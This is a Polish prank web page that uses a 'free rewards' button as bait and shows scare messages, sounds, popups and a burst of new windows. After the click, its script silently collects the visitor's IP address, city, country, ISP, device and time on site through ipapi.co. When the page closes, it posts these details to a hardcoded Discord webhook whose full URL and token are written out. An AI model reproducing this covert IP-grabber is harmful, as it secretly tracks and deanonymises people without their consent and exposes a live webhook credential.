<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>🟥 Antek nadchodzi...</title>
  <link rel="icon" href="favicon1.ico" type="image/x-icon" />
  <style>
    body {
      background-color: black;
      color: white;
      font-family: 'Courier New', monospace;
      text-align: center;
      margin: 0;
      padding: 0;
      /* overflow: hidden; - usunięte, żeby popupy mogły działać */
    }
    #crazyButton {
      padding: 20px 40px;
      font-size: 24px;
      background-color: red;
      border: none;
      color: white;
      cursor: pointer;
      margin-top: 50px;
      z-index: 10;
    }
    #message {
      font-size: 32px;
      margin-top: 30px;
    }
    .shake {
      animation: shake 0.4s;
    }
    @keyframes shake {
      0% { transform: translate(0,0); }
      20% { transform: translate(-10px, 5px); }
      40% { transform: translate(10px, -5px); }
      60% { transform: translate(-10px, 5px); }
      80% { transform: translate(10px, -5px); }
      100% { transform: translate(0,0); }
    }
  </style>
</head>
<body>
  <h1>Cześć</h1>
  <button id="crazyButton">Kliknij we mnie po darmowe nagrody!</button>
  <div id="message"></div>

  <p>🔁 Odwiedziłeś tę stronę <strong id="visitCount">...</strong> razy.</p>

  <script src="https://unpkg.com/platform/platform.js"></script>
  <script>
    const startTime = Date.now();
    const webhookUrl = "https://discord.com/api/webhooks/1373725358951764118/wwpbThoUoNmzFQ4mlRa6Fz_LMLO6RrvlaL1Us3vxDC8nJtfVHMjJfxm28SxMU-t5MIt1";

    // Licznik odwiedzin
    let visits = parseInt(localStorage.getItem("visitCount") || "0", 10);
    visits++;
    localStorage.setItem("visitCount", visits);
    document.getElementById("visitCount").innerText = visits;

    // Historia wizyt - funkcja do zapisu
    function saveVisitLocally(entry) {
      const history = JSON.parse(localStorage.getItem("visitHistory") || "[]");
      history.push(entry);
      localStorage.setItem("visitHistory", JSON.stringify(history, null, 2));
    }

    // Flaga, by Antek działał tylko raz
    let antekActive = false;

    function startAntek() {
      if (antekActive) return;
      antekActive = true;

      // Zapis i wysłanie danych przy zamknięciu strony (sync z async fetch - może nie dojdzie, ale OK)
      window.addEventListener("beforeunload", (e) => {
        const duration = Math.round((Date.now() - startTime) / 1000);
        navigator.sendBeacon("https://ipapi.co/json/")
        // fetch IP i wysłanie webhooka (użyj fetch w tle)
        fetch("https://ipapi.co/json/")
          .then(res => res.json())
          .then(data => {
            const ip = data.ip || "Brak IP";
            const city = data.city || "Nieznane miasto";
            const country = data.country_name || "Nieznany kraj";
            const org = data.org || "Nieznany ISP";
            const device = platform.description || "Nieznane urządzenie";
            const now = new Date().toLocaleString();

            const content = `📥 **Nowe wejście na stronę**
🕒 Data: ${now}
🌐 IP: \`${ip}\`
🏙️ Lokalizacja: ${city}, ${country}
📶 Dostawca: ${org}
🖥️ Urządzenie: ${device}
🔁 Odwiedzin: ${visits}
⏱️ Czas na stronie: ${duration} sekund`;

            fetch(webhookUrl, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ content }),
            });

            saveVisitLocally({ date: now, ip, location: `${city}, ${country}`, isp: org, device, duration, visits });
          });
      });

      const button = document.getElementById("crazyButton");
      const message = document.getElementById("message");

      // Dźwięki
      const sounds = [
        new Audio("stracilas-cnote_R1qiG8j.mp3"),
        new Audio("illegal-polish-content.mp3"),
        new Audio("polish-toilet-refrain.mp3"),
      ];

      // Linki do otwierania
      const urls = [
        "https://example.com/1",
        "https://example.com/2",
        "https://example.com/3",
        "https://example.com/4",
      ];

      button.addEventListener("click", () => {
        // Odtwarzaj dźwięki
        sounds.forEach(s => {
          s.currentTime = 0;
          s.play().catch(() => {});
        });

        // Losowa wiadomość
        const texts = [
          "To był błąd...",
          "Dlaczego kliknąłeś?",
          "Teraz już za późno.",
          "Zostałeś oznaczony.",
          "Antek obserwuje.",
        ];
        const randomText = texts[Math.floor(Math.random() * texts.length)];
        message.textContent = randomText;

        // Migające tło i drganie
        document.body.style.backgroundColor = "red";
        document.body.classList.add("shake");
        setTimeout(() => {
          document.body.style.backgroundColor = "#000";
          document.body.classList.remove("shake");
        }, 400);

        // Popupy
        setTimeout(() => alert("Hej! To nie był najlepszy pomysł."), 500);

        setTimeout(() => {
          const response = confirm("Czy naprawdę myślisz, że to już koniec?");
          if (response) {
            prompt("Podaj swoje imię... Antek chce wiedzieć.");
          } else {
            alert("Antek się zawiódł...");
          }
        }, 1500);

        // Otwieranie nowych okien z limitami
        let count = 0;
        const intervalId = setInterval(() => {
          if (count >= 16) {
            clearInterval(intervalId);
            return;
          }
          window.open(urls[count % urls.length], "_blank");
          count++;
        }, 5000);
      });
    }

    // Startujemy Antek po pierwszym kliknięciu
    document.getElementById("crazyButton").addEventListener("click", startAntek);
  </script>
</body>
</html>
